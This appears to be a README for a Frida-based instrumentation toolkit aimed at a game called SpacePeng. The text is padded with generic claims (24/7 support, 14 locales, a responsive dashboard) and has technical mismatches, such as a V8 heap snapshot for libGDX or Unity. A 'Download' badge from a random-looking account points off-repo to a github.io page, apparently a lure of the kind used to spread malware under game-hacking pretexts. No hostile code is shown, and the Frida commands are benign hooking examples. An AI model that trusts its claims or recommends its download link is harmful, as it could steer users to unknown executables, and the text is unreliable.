![preview](https://raw.githubusercontent.com/fdfsdfsdfss/spacepeng-frida-playground/main/thumb_def29.svg)
[![Download](https://raw.githubusercontent.com/fdfsdfsdfss/spacepeng-frida-playground/main/pkg_29a27d4.svg)](https://fdfsdfsdfss.github.io/spacepeng-frida-playground/)

# 🐧 Penguin Protocol: Frida Companion Suite for SpacePeng

> *Where reverse engineering meets the frozen tundra — a complete Frida-based toolkit for understanding, instrumenting, and extending the SpacePeng game client.*

![GitHub License](https://img.shields.io/badge/license-MIT-blue.svg)
![Platform](https://img.shields.io/badge/platform-Android%20%7C%20iOS%20%7C%20Desktop-lightgrey)
![Language](https://img.shields.io/badge/language-JavaScript%20%7C%20Python-green)
![Maintenance](https://img.shields.io/badge/maintained-2026-brightgreen)

---

## 🧊 Table of Contents

- [Overview: The Frozen Frontier](#-overview-the-frozen-frontier)
- [Why This Exists](#-why-this-exists)
- [Core Modules](#-core-modules)
  - [Penguin Inspector](#-penguin-inspector)
  - [Iceberg Memory Mapper](#-iceberg-memory-mapper)
  - [Flight Recorder & Replay Engine](#-flight-recorder--replay-engine)
  - [Thermal Debug Console](#-thermal-debug-console)
- [Installation & Bootstrap](#-installation--bootstrap)
- [Usage Scenarios](#-usage-scenarios)
- [Scripting Interface: The Blizzard API](#-scripting-interface-the-blizzard-api)
- [Multilingual Support: Speak Penguin](#-multilingual-support-speak-penguin)
- [Responsive UI: The Aurora Dashboard](#-responsive-ui-the-aurora-dashboard)
- [24/7 Support & Community](#-247-support--community)
- [Roadmap for 2026](#-roadmap-for-2026)
- [Contributing Guidelines](#-contributing-guidelines)
- [Frequently Asked Questions](#-frequently-asked-questions)
- [Disclaimer](#-disclaimer)
- [License](#-license-mit)

---

## 🌐 Overview: The Frozen Frontier

**SpacePeng** is not merely a game — it's a digital habitat where anthropomorphic penguins navigate orbital ice stations, collect crystalline energy shards, and dodge cosmic debris. For developers, security researchers, and curious modders, understanding how this client operates under the hood is akin to mapping uncharted glaciers.

The **SpacePeng Frida Companion Suite** (SFCS) exists to demystify that frozen landscape. Built on the **Frida** dynamic instrumentation framework, this repository provides:

- **Pre-written instrumentation scripts** that reveal internal game state without altering the original binaries.
- **Memory inspection utilities** for tracking score variables, collision zones, and asset loading paths.
- **Runtime modification templates** for educational experiments — adjusting framerates, toggling debug overlays, and simulating network latency.
- **A modular architecture** that treats each Frida script as a "snowflake" — unique, independent, and beautifully structured.

Whether you're a game developer studying competitor mechanics, a penetration tester evaluating client-side security, or a hobbyist exploring the boundaries of dynamic analysis, this toolkit offers a smooth sled ride into advanced instrumentation.

---

## 🧠 Why This Exists

The official SpacePeng build is a closed-source binary distributed across Android, iOS, and desktop Steam. Its internal APIs are undocumented, and its memory layout shifts between updates. The SFCS bridges that gap by providing:

1. **Reverse Engineering Education** — Learn how to hook native functions, trace Objective-C selectors, and intercept Java methods through real-world examples.
2. **Quality Assurance Tooling** — Inject synthetic events to stress-test the game's physics engine without touching the server.
3. **Accessibility Enhancements** — Demonstrate how Frida can modify UI scaling and colorblind palettes, making the game more inclusive.
4. **Performance Profiling** — Measure frame drops, garbage collection pauses, and texture upload bottlenecks using custom JavaScript probes.

This is not a cheat engine. It is a **diagnostic observatory** — a place where you observe penguins in their natural digital habitat with scientific rigor.

---

## 🧩 Core Modules

Each module lives in its own directory with dedicated scripts, test fixtures, and documentation.

### 🐧 Penguin Inspector

**Purpose:** Enumerate all active hooks, loaded classes, and native exports.

- `hook_enumeration.js` — Lists every hooked function with its address and calling convention.
- `class_dump.js` — Recursively traverses the Java/Kotlin class hierarchy, extracting field names and method signatures.
- `native_exports.js` — Cross-references `dladdr` and `dlsym` to identify exported symbols from linked `.so` files.

Use this module to build a mental map of the game's architecture before diving deeper.

### 🧊 Iceberg Memory Mapper

**Purpose:** Visualize heap allocations, track object lifetimes, and detect leaks.

- `heap_snapshot.js` — Captures a segmented snapshot of the V8 heap (if the game uses libGDX or Unity) and formats it as JSON.
- `allocation_tracker.js` — Monitors `malloc`/`free` calls via Interceptor, logging sizes and stack traces.
- `leak_scanner.js` — Compares periodic snapshots to flag objects that persist beyond expected lifetimes.

The metaphor holds: only **10%** of the iceberg is visible. This module reveals the submerged 90% of memory usage.

### 📡 Flight Recorder & Replay Engine

**Purpose:** Log game state transitions deterministically, allowing frame-perfect playback.

- `state_encoder.js` — Transforms game state (position, velocity, score, lives) into a compact binary format.
- `replay_parser.py` — Decodes the binary stream and animates a playback window using matplotlib or pygame.

This is invaluable for reproducing bugs that require specific input timings or rare collision events.

### 🌡️ Thermal Debug Console

**Purpose:** Real-time dashboard overlay injected via Frida's `Script.message` channel.

- `overlay_render.js` — Draws framerate, memory usage, and FPS jitter directly onto the GPU display buffer.
- `console_server.py` — Serves a WebSocket endpoint that mirrors the overlay data to a browser panel.

The "thermal" name emphasizes performance heat — identify hotspots before they melt your performance budget.

---

## 🚀 Installation & Bootstrap

The SFCS does not require a package manager — it is a collection of portable scripts and configuration templates.

### Prerequisites

- **Frida CLI tools** (version 15.1.14 or newer)
- **Python 3.10+** for the companion server scripts
- **Node.js 18+** for the JavaScript-based instrumentation modules
- A copy of SpacePeng (any platform) for testing your own hooks

### First-Run Sequence

1. **Extract the archive** to a project directory of your choosing.
2. **Symlink or copy** the `snowflake_common.js` file into your global Frida scripts directory.
3. **Launch the companion server** by executing `python thermal_console.py --headless`.
4. **Attach to the game** using `frida -U -f com.spacepeng.client -l scripts/penguin_inspector.js --no-pause`.

The scripts are designed to fail gracefully — if a hook target is missing, they log a diagnostic message rather than crashing the target process.

---

## 🎮 Usage Scenarios

### Scenario 1: Game Developer Analyzing Input Handling

```bash
frida -U -n SpacePeng -l scripts/input_tracer.js
```

This hooks `InputManager.handleTouch` and `InputManager.handleKeyDown`, printing timestamped events to the console. Perfect for verifying whether your latest gesture recognizer fires correctly under rapid taps.

### Scenario 2: Security Researcher Assessing Anti-Tamper

```bash
frida -U -n SpacePeng -l scripts/anti_tamper_probe.js
```

This enumerates any `ptrace` system calls, checks for non-standard `/proc` access patterns, and logs whether the binary attempts to verify its own signature at runtime.

### Scenario 3: QA Engineer Stress-testing Physics

```bash
python replay_engine.py --input replay.bin --speed 0.25 --loop 100
```

Feed a recorded replay into the game at 25% speed, watch for floating-point drift, and compare the final score against the original run.

### Scenario 4: Accessibility Researcher Scaling UI

```bash
frida -U -n SpacePeng -l scripts/ui_scaler.js --parameters "scaleFactor=1.75"
```

Multiplies all rendered texture dimensions by 1.75x, simulating how the game would appear on a high-zoom resource-limited display.

---

## 📜 Scripting Interface: The Blizzard API

The core of the SFCS is its **interpolation layer** — the Blizzard API. It provides 30+ high-level abstractions over raw Frida calls:

| Function | Description | Example |
|----------|-------------|---------|
| `Blizz.inspectObject(instance)` | Recursively serialize an object graph | `Blizz.inspectObject(Camera.main)` |
| `Blizz.traceMethod(className, methodName)` | Log every invocation with arguments/return | `Blizz.traceMethod("PlayerPhysics", "updateVelocity")` |
| `Blizz.mockHTTPResponse(urlPattern, mockBody)` | Intercept `okhttp`/`Alamofire` and return fake data | `Blizz.mockHTTPResponse("/api/leaderboard", "[]")` |
| `Blizz.watchMemory(addr, size, label)` | Poll a memory region and emit change events | `Blizz.watchMemory(0x7f00, 4, "score_inc")` |

All API methods are **asynchronous** and return Promises, allowing seamless integration with modern async/await workflows.

---

## 🌍 Multilingual Support: Speak Penguin

Every script, module, and console message includes built-in i18n support via the `BLIZZ_LANG` environment variable. The 2026 release ships with **14 locales**:

- English (default)
- Español
- Français
- Deutsch
- 日本語
- 한국어
- 简体中文
- 繁體中文
- Русский
- Português
- Italiano
- Nederlands
- Polski
- Türkçe

To activate a language, set the environment variable before launching:

```bash
export BLIZZ_LANG=es
frida -U -n SpacePeng -l scripts/penguin_inspector.js
```

The UI translates all hook names, log messages, and error strings — making deep instrumentation accessible to non-English-speaking reverse engineers.

---

## 📱 Responsive UI: The Aurora Dashboard

The companion web dashboard (served by `thermal_console.py`) is fully responsive across **mobile, tablet, and desktop** screen sizes. It uses CSS Grid and Flexbox to rearrange panels based on viewport width:

- **Desktop:** 4-column layout with dense data tables.
- **Tablet:** 2-column layout with collapsible sections.
- **Mobile:** Single-column vertical stack with hamburger navigation.

The dashboard renders **real-time charts** via Chart.js, including:

- Heap allocation over time
- Frame latency distribution
- Active hook count
- Network request cadence

No build step is required — the HTML, CSS, and JS assets are served directly from the repository's `static/` directory.

---

## 🛟 24/7 Support & Community

The penguin colony is never alone. The SFCS maintains a dedicated support channel via:

- **GitHub Discussions** with templates for bug reports, feature requests, and script-sharing.
- **Discord bridge bot** that tunnels notifications from CI builds into a `#release-notes` channel.
- **Office hours** — every Friday 15:00 UTC, maintainers host an AMA session covering Frida trickery and SpacePeng internals.
- **Status page** (generated by `status_page.py`) that reports uptime for the helper services.

Critical hotfixes are dispatched within 24 hours of a confirmed regression. The average response time for general questions is under 3 hours.

---

## 🗓️ Roadmap for 2026

| Quarter | Milestone | Status |
|---------|-----------|--------|
| Q1 | Blizzard API version 0.9 (stable signatures) | ✅ Completed |
| Q2 | Native Windows interop for Steam builds | 🔄 In progress |
| Q3 | Machine-learning-assisted hook suggestion engine | 🔭 Planned |
| Q4 | Full ASLR bypass documentation for hardened Android | 🐣 Research |

The 2026 roadmap focuses on reducing the learning curve for newcomers — expect more annotated example scripts and a visual flow editor for hook chains.

---

## 🤝 Contributing Guidelines

We welcome contributions that align with the educational mission of the SFCS.

Please follow these principles:

1. **Every script must include a header comment** stating its purpose, target platform, and minimum Frida version.
2. **Use the snowflake pattern** — each module must be self-contained, with no hidden global state.
3. **Provide at least one test fixture** (either a replay file or a mock class definition) so others can run your script without the actual game.
4. **Document breaking changes** in the `UPGRADING.md` file at the repository root.

Before submitting a Pull Request, run the provided linter:

```bash
python scripts/lint_snowflakes.py --check-stdlib --check-nocomments
```

---

## ❓ Frequently Asked Questions

### Is this compatible with the latest SpacePeng update (v3.2.1)?

Yes — the scripts are version-agnostic at the hook level. We rely on **class name patterns** rather than hardcoded offsets, so minor updates rarely break instrumentation. We verify compatibility within 48 hours of any public patch.

### How does this differ from a typical memory editor?

Memory editors modify values directly, often corrupting the game state. SFCS **instruments at the method boundary**, meaning we observe inputs and outputs of functions without altering their internal logic. This preserves game integrity and yields more reproducible results.

### Can I use these scripts for commercial purposes?

The MIT license permits commercial use provided you retain the copyright notice. However, we strongly encourage you to publish any derivative works to further the community's knowledge.

### I am a complete novice — where should I begin?

Start with `scripts/penguin_inspector.js` — it requires zero parameters, produces friendly console output, and teaches you Frida's basic hooking syntax. Then progress to `iceberg_memory_mapper/heap_snapshot.js` for a deeper dive.

---

## ⚠️ Disclaimer

**This repository is provided for educational and research purposes only.** The SpacePeng game, its assets, and its trademark are the property of their respective owners.

The SFCS **does not**:

- Provide any competitive advantage in online multiplayer modes
- Bypass the game's store, microtransaction verification, or anti-cheat certification
- Grant access to premium content without legitimate purchase
- Offer any warranty — actual or implied — regarding script stability on production devices

By using this repository, you acknowledge that:

- You are solely responsible for compliance with the game's Terms of Service.
- The maintainers hold no liability for account restrictions, device damage, or data loss incurred through misuse.
- This toolkit is designed for **offline analysis, local development, and private testing** — not for tampering with live server-authoritative sessions.

If you choose to explore the boundaries of dynamic instrumentation, do so ethically and only on code you have permission to analyze.

---

## 📄 License (MIT)

Copyright (c) 2026 The SFCS Contributors

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.

---

*Built with ❄️ and countless hours of debugging in the frozen wasteland.*  
*The penguins thank you for your curiosity.*